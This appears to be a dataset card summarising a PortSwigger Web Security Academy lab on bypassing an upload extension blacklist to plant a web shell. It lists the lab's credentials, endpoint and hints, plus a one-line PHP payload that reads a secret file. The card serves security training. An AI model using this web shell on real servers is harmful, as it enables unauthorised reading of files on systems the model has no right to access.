## Web shell upload via extension blacklist bypass

**Category:** file_upload
**Difficulty:** Unknown

### Description
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

### Solution Steps
You need to upload two different files to solve this lab.

### Key Payloads
- `/home/carlos/secret`
- `wiener:peter`
- `/files/avatars/<YOUR-IMAGE>`
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `.php`
- `POST /my-account/avatar`
- `filename`
- `.htaccess`
- `Content-Type`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: file_upload

---
*Source: PortSwigger Web Security Academy*
